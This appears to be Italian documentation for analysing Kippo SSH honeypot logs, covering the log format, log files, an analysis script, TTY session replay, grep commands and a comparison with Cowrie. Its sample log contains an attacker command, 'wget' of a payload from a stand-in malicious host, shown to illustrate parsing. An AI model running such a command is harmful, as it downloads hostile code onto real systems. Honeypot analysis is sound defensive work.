# Analisi dei dati raccolti da Kippo

## Formato dei log

A differenza di Cowrie, Kippo produce log in formato testo semplice. Ogni riga rappresenta un evento con timestamp, livello e descrizione. Non esiste un formato JSON nativo.

Esempio di righe di log:

```
2014-04-23 22:00:00+0200 [SSHService ssh-userauth on HoneyPotTransport,5,1.2.3.4] login attempt [root/123456] succeeded
2014-04-23 22:00:01+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,5,1.2.3.4] CMD: uname -a
2014-04-23 22:00:02+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,5,1.2.3.4] CMD: wget http://malicious.example.com/payload.sh
```

## Struttura dei log

| File | Contenuto |
|------|-----------|
| `log/kippo.log` | Log principale con tutti gli eventi |
| `log/tty/*.log` | Sessioni TTY registrate in formato binario |
| `dl/` | File scaricati dagli attaccanti |

## Utilizzo dello script di analisi

```bash
cd analysis/
pip install -r requirements.txt
python analyze_logs.py --input /opt/kippo/kippo-git/log/kippo.log
```

Lo script estrae:
- Credenziali piu utilizzate (login riusciti e falliti)
- Comandi piu eseguiti nella shell emulata
- IP piu attivi
- File scaricati dagli attaccanti

## Replay delle sessioni TTY

```bash
/opt/kippo/kippo-git/utils/playlog.py /opt/kippo/kippo-git/log/tty/<file-sessione>
```

## Analisi con grep

Per analisi rapide da terminale senza strumenti aggiuntivi:

```bash
# Login riusciti
grep "login attempt.*succeeded" /opt/kippo/kippo-git/log/kippo.log

# Top 10 password
grep "login attempt" /opt/kippo/kippo-git/log/kippo.log | \
    grep -oP '\[\K[^\]]+(?=\])' | \
    cut -d'/' -f2 | sort | uniq -c | sort -rn | head -10

# Comandi eseguiti
grep "CMD:" /opt/kippo/kippo-git/log/kippo.log | sed 's/.*CMD: //'
```

## Confronto con i log di Cowrie

I log di Cowrie in formato JSON sono molto piu semplici da analizzare automaticamente rispetto ai log testuali di Kippo. Questo e uno dei motivi principali per cui il formato JSON e stato adottato in Cowrie: permette di usare strumenti come `jq` o pipeline di analisi standardizzate senza dover fare parsing di testo semi-strutturato.
